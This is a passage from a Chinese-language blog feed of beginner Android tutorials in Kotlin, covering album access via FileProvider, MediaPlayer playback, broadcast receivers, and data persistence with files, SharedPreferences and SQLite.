&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们还需要在<code>AndroidManifest.xml</code>中声明fileProvider</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:authorities</span>=<span class="string">&quot;top.zfxt.cameraalbumtest.fileprovider&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span></span></span><br><span class="line"><span class="tag">			   <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 这是定义的xml路径文件<br> <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">external-path</span> <span class="attr">name</span>=<span class="string">&quot;my_images&quot;</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="访问相册"><a href="#访问相册" class="headerlink" title="访问相册"></a>访问相册</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">binding.fromAlbumBtn.setOnClickListener &#123;</span><br><span class="line">            <span class="comment">//打开文件选择器</span></span><br><span class="line">            <span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(Intent.ACTION_OPEN_DOCUMENT)</span><br><span class="line">            intent.addCategory(Intent.CATEGORY_OPENABLE)</span><br><span class="line">            <span class="comment">//指定只显示图片</span></span><br><span class="line">            intent.type = <span class="string">&quot;image/*&quot;</span></span><br><span class="line">            startActivityForResult(intent, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br><span class="line">		...</span><br><span class="line">		<span class="number">2</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (resultCode == Activity.RESULT_OK &amp;&amp; data != <span class="literal">null</span>) &#123;</span><br><span class="line">                    data.data?.let &#123;</span><br><span class="line">                        <span class="comment">//将选择的图片展示出来</span></span><br><span class="line">                        <span class="type">val</span> <span class="variable">bitmap</span> <span class="operator">=</span> getBitmapFromUri(it)</span><br><span class="line">                        binding.imageView.setImageBitmap(bitmap)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">		...</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> fun <span class="title function_">getBitmapFromUri</span><span class="params">(uri: Uri)</span> = contentResolver</span><br><span class="line">        .openFileDescriptor(uri, <span class="string">&quot;r&quot;</span>)?.use &#123;</span><br><span class="line">            BitmapFactory.decodeFileDescriptor(it.fileDescriptor)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="播放多媒体文件"><a href="#播放多媒体文件" class="headerlink" title="播放多媒体文件"></a>播放多媒体文件</h2><h4 id="mediaPlayer"><a href="#mediaPlayer" class="headerlink" title="mediaPlayer"></a>mediaPlayer</h4><p>Android常用的用来处理音频文件的是MediaPlayer类。<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(%E4%BD%BF%E7%94%A8%E5%A4%9A%E5%AA%92%E4%BD%93)-2023-07-10-20-26.png"><br>以上是一些常用的控制方法。</p>
<p>工作流程：</p>
<ol>
<li>首先需要创建一个MediaPlayer对象，然后调用setDataSource()方法设置音频文件的路径。</li>
<li>调用prepare()方法使MediaPlayer进入准备状态</li>
<li>接下来调用start()方法就可以开始播放音频，调用pause()方法就会暂停播放，调用reset()方法就会停止播放。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">val</span> <span class="variable">mediaplayer</span> <span class="operator">=</span> MediaPlayer()</span><br><span class="line">    <span class="keyword">private</span> lateinit <span class="keyword">var</span> binding: ActivityMainBinding</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line">        initMediaPlayer()</span><br><span class="line">        binding.play.setOnClickListener &#123;</span><br><span class="line">            <span class="keyword">if</span> (!mediaplayer.isPlaying) &#123;</span><br><span class="line">                mediaplayer.start()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        binding.pause.setOnClickListener &#123;</span><br><span class="line">            <span class="keyword">if</span> (mediaplayer.isPlaying) &#123;</span><br><span class="line">                mediaplayer.pause() <span class="comment">// 暂停播放</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        binding.stop.setOnClickListener &#123;</span><br><span class="line">            <span class="keyword">if</span> (mediaplayer.isPlaying) &#123;</span><br><span class="line">                mediaplayer.reset() <span class="comment">// 停止播放</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> fun <span class="title function_">initMediaPlayer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">assetMannager</span> <span class="operator">=</span> assets</span><br><span class="line">        <span class="type">val</span> <span class="variable">fd</span> <span class="operator">=</span> assetMannager.openFd(<span class="string">&quot;肉肉.mp3&quot;</span>)</span><br><span class="line">        mediaplayer.setDataSource(fd.fileDescriptor, fd.startOffset, fd.length)</span><br><span class="line">        mediaplayer.prepare()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy()</span><br><span class="line">        mediaplayer.stop()</span><br><span class="line">        mediaplayer.release()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="videoPlayer"><a href="#videoPlayer" class="headerlink" title="videoPlayer"></a>videoPlayer</h4><p><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(%E4%BD%BF%E7%94%A8%E5%A4%9A%E5%AA%92%E4%BD%93)-2023-07-02-21-51.png"></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(广播机制)</title>
    <url>/posts/86699eae/</url>
    <content><![CDATA[<p>两种广播机制：</p>
<ol>
<li>标准广播：完全异步执行的广播，几乎所有接受者都会同时受到这个广播消息。这种广播效率高，这也意味着它不能被截断</li>
<li>有序广播：同步执行的广播，根据接收者优先级顺序依次发送。而且中途可以被截断。A–&gt;B–&gt;C;B可以在中途截断广播的传输。</li>
</ol>
<h2 id="接受系统广播"><a href="#接受系统广播" class="headerlink" title="接受系统广播"></a>接受系统广播</h2><p>android内置了很多系统级别的广播，比如手机开机，电量变化。这些都可以接收。</p>
<ol>
<li>动态接收<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    <span class="comment">//声明一个时间改变接收器，它继承自BroadcastReceiver</span></span><br><span class="line">    lateinit <span class="keyword">var</span> timeChangeReceiver: TimeChangeReceiver</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContentView(R.layout.activity_main)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//声明一个intent过滤器，他和androidManifest中的配置项一样，可以限定接收那些action，catogory。</span></span><br><span class="line">        <span class="type">val</span> <span class="variable">intentFilter</span> <span class="operator">=</span> IntentFilter()</span><br><span class="line">        <span class="comment">//接收时间改变动作</span></span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;android.intent.action.TIME_TICK&quot;</span>)</span><br><span class="line">        timeChangeReceiver = TimeChangeReceiver()</span><br><span class="line">        <span class="comment">//将该过滤器接收到的广播消息交给时间改变接收器</span></span><br><span class="line">        registerReceiver(timeChangeReceiver,intentFilter)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy()</span><br><span class="line">        unregisterReceiver(timeChangeReceiver)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//它通过重写onReceive方法去回调的执行方法</span></span><br><span class="line">    inner <span class="keyword">class</span> <span class="title class_">TimeChangeReceiver</span>:BroadcastReceiver()&#123;</span><br><span class="line">        override fun <span class="title function_">onReceive</span><span class="params">(context: Context, intent:Intent)</span> &#123;</span><br><span class="line"></span><br><span class="line">            Toast.makeText(context,<span class="string">&quot;Time has changed&quot;</span>,Toast.LENGTH_SHORT).show()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>2.静态接收<br>静态接收的步骤也简单：</p>
<ol>
<li>声明一个BroadcastReceiver类，并重写他的onReceive方法</li>
<li>在AndroidManifest中注册使用它：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">				<span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">				<span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
这里表示它接收一个开启信号。<blockquote>
<p>Android为了保护用户的隐私，有着严格的规定，对于某些比较敏感的操作，必须声明权限。不然程序直接奔溃无法启动。例如：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
就必须声明了接收开机信号，才能在receiver中使用。<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6)-2023-07-03-03-06.png"></li>
</ol>
<p><strong>注意，不要再broadcast的onReceive中添加过多的逻辑，或者耗时操作。因为onReceive是不允许开启线程的。如果它运行了过长时间，程序就会报错。</strong></p>
<h2 id="发送广播"><a href="#发送广播" class="headerlink" title="发送广播"></a>发送广播</h2><h3 id="标准广播"><a href="#标准广播" class="headerlink" title="标准广播"></a>标准广播</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    <span class="keyword">private</span> lateinit <span class="keyword">var</span> binding: ActivityMainBinding</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line">        binding.apply &#123;</span><br><span class="line">            button.setOnClickListener &#123;</span><br><span class="line">                <span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="string">&quot;top.zfxt.My_BROADCAST&quot;</span>)</span><br><span class="line">                <span class="comment">//默认情况下我们发出的都是隐式广播，而Android8.0后，静态注册的接收器无法接收隐式广播</span></span><br><span class="line">                <span class="comment">//因此我们需要显式的声明问要发给那个应用程序的，将他变为显示广播</span></span><br><span class="line">                intent.setPackage(packageName)</span><br><span class="line">                sendBroadcast(intent)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们用Intent来发送广播，发送一个我们自定义的广播：<code>top.zfxt.My_BROADCAST</code>。然后定义receive会接收该广播</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">				<span class="attr">android:name</span>=<span class="string">&quot;.BootCompleteReceiver&quot;</span></span></span><br><span class="line"><span class="tag">				<span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">				<span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;top.zfxt.My_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="有序广播"><a href="#有序广播" class="headerlink" title="有序广播"></a>有序广播</h3><ol>
<li>将sendBroadcast换成sendOrderBroadcast<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//                sendBroadcast(intent)</span></span><br><span class="line">                <span class="comment">//发送有序广播，第一个参数就是发送的intent，第二个参数是与权限相关的字符串。</span></span><br><span class="line">                sendOrderedBroadcast(intent,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></li>
<li>发送有序广播的话，需要定义接收器的优先级，顺序。通过<code>priority</code>来定义。如：<br><code>&lt;intent-filter android:priority=&quot;100&quot;&gt;</code><br>数字越大，优先级越高。</li>
<li>有序广播是可以阻断的，所以可以再<code>onReceive</code>中使用<code>abortBroadcast()</code>，这个方法将会阻断广播的传播。</li>
</ol>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(数据持久化)</title>
    <url>/posts/e8a3427e/</url>
    <content><![CDATA[<h2 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h2><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>Context提供了一个<code>openFileOutput()</code>方法，他需要两个参数，第一个参数是文件名，不准带路径，因为所有的文件都会默认保存到<code>/data/data/&lt;package name&gt;/files/</code>下，第二个参数是操作模式，主要有<code>MODE_PRIVATE</code>和<code>MODE_APPEND</code>一个是覆写，一个是追加。<br>openFileOutput()返回的是一个outputstream()</p>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>Context提供了一个<code>openFileInput()</code>，他只需要一个参数，就是文件名，它返回的是一个inputstream流。系统会自动到<code>/data/data/&lt;package name&gt;/files/</code>下寻找文件。然后你通过流的方式读取文件。</p>
<blockquote>
<p>setSelection()是Edittext中，用来调节光标位置的方法。</p>
</blockquote>
<h2 id="SharedPreferences存储"><a href="#SharedPreferences存储" class="headerlink" title="SharedPreferences存储"></a>SharedPreferences存储</h2><p>在SharedPreferences中，他是通过key-value的方式存储数据的。而且它存储后的内容是通过xml进行保存的。<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96)-2023-07-06-04-25.png">它被保存在一个固定的目录中<code>/data/data/&lt;packagename&gt;/shared_prefs/</code>。</p>
<h3 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h3><ol>
<li>Context提供了一个<code>getSharedPreferences()</code>方法，通过该方法可以获取一个对象，它接收两个参数，第一个参数是文件名。第二个参数是操作模式。目前只有<code>MODE_PRIVATE</code>其他均已被废除。</li>
<li>Activity提供了一个<code>getPreferences()</code>方法，它只需要填如操作模式，它默认把文件名定义为activity的类名。</li>
</ol>
<p>存储主要可以分为3步实现。</p>
<ol>
<li>调用SharedPreferences对象的edit()方法获取一个<br>SharedPreferences.Editor对象。</li>
<li>向SharedPreferences.Editor对象中添加数据，比如添加一个布尔型数据就使用<br>putBoolean()方法，添加一个字符串则使用putString()方法，以此类推。</li>
<li>调用apply()方法将添加的数据提交，从而完成数据存储操作。</li>
</ol>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><ol>
<li>调用SharedPreferences对象的edit()方法获取一个SharedPreferences.Editor对象。</li>
<li>调用getString()等方法来获取。他也需要两个参数，第一个参数是key键，第二个参数是，如果没读取出来，设置某个默认值。</li>
</ol>
<h2 id="数据库存储"><a href="#数据库存储" class="headerlink" title="数据库存储"></a>数据库存储</h2><p>Android内置了SQLite数据库为我们使用。这个数据库很小巧。而且运行超快。</p>
<h3 id="SQLiteOpenHelper"><a href="#SQLiteOpenHelper" class="headerlink" title="SQLiteOpenHelper"></a>SQLiteOpenHelper</h3><p>这是android为我们提供的一种帮助类，通过这个类，可以简单的创建和使用数据库。<br>它本身是一个抽象类，我们需要继承并实现他的两个抽象方法:<code>onCreate()</code>,<code>onUpgrade()</code>。然后这两个方法中实现创建数据库和升级数据库的逻辑。<br>他还有两个重要的实例方法：<code>getReadableDatabase()</code>和<code>getWritableDatabase()</code>。这两个方法都可以创建或者打开一个数据库。并返回一个能对数据库进行读写的对象。这两个方法不同的是，如果数据库不可写入，如磁盘已满，那么read获得的是一个只能读的对象。而write会直接报错。<br>SQLiteOpenHelper有两个构造方法可以重写。<br>一般使用参数较少的这个：<br>四个参数：context，数据库名，可以自定义的cursor，当前数据库的版本号。<br>数据库文件创建完后会存放在<code>/data/data/&lt;packagename&gt;/databases/</code>目录下。</p>
<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><ol>
<li>首先先构建好SQLiteOpenHelper，并完成<code>onCreate</code>和<code>onUpgrade</code>的重写</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyDataBaseHelper</span>(val context: Context, val name: String, val version: Int) :</span><br><span class="line">    SQLiteOpenHelper(context, name, <span class="literal">null</span>, version) &#123;</span><br><span class="line">        <span class="comment">//sql语句</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">val</span> <span class="variable">createBook</span> <span class="operator">=</span> <span class="string">&quot;create table Book (&quot;</span> +</span><br><span class="line">            <span class="string">&quot; id integer primary key autoincrement,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;author text,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;price real,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;pages integer,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;name text)&quot;</span></span><br><span class="line">        <span class="comment">//sql语句</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">val</span> <span class="variable">createCategory</span> <span class="operator">=</span> <span class="string">&quot;create table Category (&quot;</span> +</span><br><span class="line">            <span class="string">&quot;id integer primary key autoincrement,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;category_name text,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;category_code integer)&quot;</span></span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(db: SQLiteDatabase)</span> &#123;</span><br><span class="line">        db.execSQL(createBook)</span><br><span class="line">        db.execSQL(createCategory)</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;Creat Success&quot;</span>, Toast.LENGTH_SHORT).show()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onUpgrade</span><span class="params">(db: SQLiteDatabase, oldVersion: Int, newVersion: Int)</span> &#123;</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Book&quot;</span>)</span><br><span class="line">        db.execSQL(<span class="string">&quot;drop table if exists Category&quot;</span>)</span><br><span class="line">        onCreate(db)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>&gt; execSQL中都是填入sqluvjv
</code></pre>
<ol start="2">
<li>在activity中，构建一个MyDataBaseHelper<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">dbHelper</span> <span class="operator">=</span> MyDataBaseHelper(<span class="built_in">this</span>,<span class="string">&quot;BookStore.db&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li>与某个按钮绑定，创建数据库<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">createDatabase.setOnClickListener &#123;</span><br><span class="line">    dbHelper.writableDatabase</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
然后就完成了创建过程<br><strong>这里要注意的点：(1):writableDatabase该方法会先判断是否存在数据库，如果已经存在则只打开，否则将会创建并调用<code>onCreat()</code>方法。然后完成数据库的创建。(2):但是如果数据库已经存在了，你需要再添加新表或者对数据库结构的操作，就必须删除数据库重新调用onCreate方法。或者将</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">dbHelper</span> <span class="operator">=</span> MyDataBaseHelper(<span class="built_in">this</span>,<span class="string">&quot;BookStore.db&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<strong>的版本号改成比1大的任意自然数。他就会调用<code>onUpgrade()</code>方法。这样子就可以实现数据库的升级。</strong></li>
</ol>
<h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><p>调用SQLiteOpenHelper的getReadableDatabase()或getWritableDatabase()方法是可以用于创建和升级数据库的，不仅如此，这两个方法还都会返回一个SQLiteDatabase对象，借助这个对象就可以对数据进行CRUD操作了。<br><strong>CRUD</strong>,四个基本操作就是增删改查。这里不做过于详细的示例，只说明大致用法：</p>
<ul>
<li>insert():</li>
</ul>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">表名</td>
<td align="center">需要添加数据的表</td>
</tr>
<tr>
<td align="center">默认值</td>
<td align="center">当未指明某列的数据时，都会填充该数据</td>
</tr>
<tr>
<td align="center">传入的数据</td>
<td align="center">他需要接收ContentValues对象，这个对象可以通过put方法重载获得新方法</td>
</tr>
<tr>
<td align="center">例如：</td>
<td align="center"></td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">values1</span> <span class="operator">=</span> ContentValues().apply &#123;</span><br><span class="line">                    <span class="comment">// 开始组装第一条数据</span></span><br><span class="line">                    put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span>)</span><br><span class="line">                    put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>)</span><br><span class="line">                    put(<span class="string">&quot;pages&quot;</span>, <span class="number">454</span>)</span><br><span class="line">                    put(<span class="string">&quot;price&quot;</span>, <span class="number">16.96</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                database.insert(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, values1) <span class="comment">// 插入第一条数据</span></span><br></pre></td></tr></table></figure>
<ul>
<li>update()</li>
</ul>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">表名</td>
<td align="center">需要添加数据的表</td>
</tr>
<tr>
<td align="center">传入的数据</td>
<td align="center">他需要接收ContentValues对象，这个对象可以通过put方法重载获得新方法</td>
</tr>
<tr>
<td align="center">约束</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">约束</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">第三四个数据使用来约束更新那几行的数据，不指定的话，就会默认更新所有行</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">示例：</td>
<td align="center"></td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">database.update(</span><br><span class="line">    <span class="string">&quot;Book&quot;</span>,</span><br><span class="line">    ContentValues().apply &#123;</span><br><span class="line">        put(<span class="string">&quot;price&quot;</span>, <span class="number">10.99</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;name = ?&quot;</span>,</span><br><span class="line">    arrayOf(<span class="string">&quot;The Da Vinci Code&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>delete()</li>
</ul>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">表名</td>
<td align="center">需要添加数据的表</td>
</tr>
<tr>
<td align="center">约束</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">约束</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">第二三个数据都是用来约束行的</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">无示例</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li>query()<br>用来查询数据的，他接收到参数很多，如图：<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96)-2023-07-14-39-18.png"><br>示例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">val strings:StringBuilder=StringBuilder()</span><br><span class="line">                <span class="type">val</span> <span class="variable">cursor</span> <span class="operator">=</span> database.query(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span>(cursor.moveToFirst())&#123;</span><br><span class="line">                    <span class="keyword">do</span>&#123;</span><br><span class="line">                        <span class="comment">//遍历所有cursor对象</span></span><br><span class="line">                        <span class="type">val</span> <span class="variable">name</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">                        <span class="type">val</span> <span class="variable">author</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;author&quot;</span>))</span><br><span class="line">                        <span class="type">val</span> <span class="variable">pages</span> <span class="operator">=</span> cursor.getInt(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>))</span><br><span class="line">                        <span class="type">val</span> <span class="variable">price</span> <span class="operator">=</span> cursor.getDouble(cursor.getColumnIndex(<span class="string">&quot;price&quot;</span>))</span><br><span class="line">                        strings.append(name+<span class="string">&quot;\t&quot;</span>+author+<span class="string">&quot;\t&quot;</span>+pages+<span class="string">&quot;\t&quot;</span>+price+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    &#125;<span class="keyword">while</span> (cursor.moveToNext())</span><br><span class="line">                    textView.text = strings</span><br><span class="line">                    strings.clear()</span><br><span class="line">                    cursor.close()</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
如果其他都不填的话，默认为<code>select * from &#39;表名&#39;</code></li>
</ul>
<h3 id="也可以直接通过sql语言去实现这些功能"><a href="#也可以直接通过sql语言去实现这些功能" class="headerlink" title="也可以直接通过sql语言去实现这些功能"></a>也可以直接通过sql语言去实现这些功能</h3><p><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96)-2023-07-00-45-53.png"></p>
<p>不做详细示例。凭个人喜好而学。</p>
<h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>sqlite也支持事务：<br>基本步骤为：<br>调用SQLiteDatabase的方法</p>
<ol>
<li>beginTransaction()方法开启一个事务</li>
<li>调用setTransactionSuccessful()表示事务已经执行成功</li>
<li>endTransaction()结束事务</li>
</ol>
<h2 id="数据库升级小技巧"><a href="#数据库升级小技巧" class="headerlink" title="数据库升级小技巧"></a>数据库升级小技巧</h2><p>首先有一些前情提要：</p>
<ol>
<li>如果库中已经存在某张表，如果再创建同名的表，将会导致报错，除非你把原表删除</li>
